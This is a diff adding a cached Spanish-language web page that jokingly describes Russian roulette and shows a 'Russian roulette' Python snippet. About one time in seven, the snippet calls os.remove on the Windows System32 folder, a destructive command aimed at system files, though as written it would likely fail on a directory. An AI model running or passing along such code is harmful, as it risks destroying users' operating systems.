@@ -1,0 +1,18 @@
+I"7
+<p>OBJETIVO:</p>
+<blockquote>
+  <p>La ruleta rusa es un juego de azar potencialmente mortal, que consiste en que un jugador coloque uno o más proyectiles dentro de un tambor de revólver, gire el cilindro (sin ver en dónde quedó el proyectil), coloque el cañón en su sien y presione el gatillo. Se juega generalmente entre dos o más personas. El objetivo es sobrevivir y quedarse con el dinero o la especie de valor a jugar.
+ADVERTENCIA: No lo intentes en Casa!</p>
+</blockquote>
+
+<p>CREADO POR: SEAN DAZA
+<code class="language-plaintext highlighter-rouge">https://github.com/seandaza</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">if</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"C:\Windows\System32"</span><span class="p">)</span>	
+</code></pre></div></div>
+
+:ET
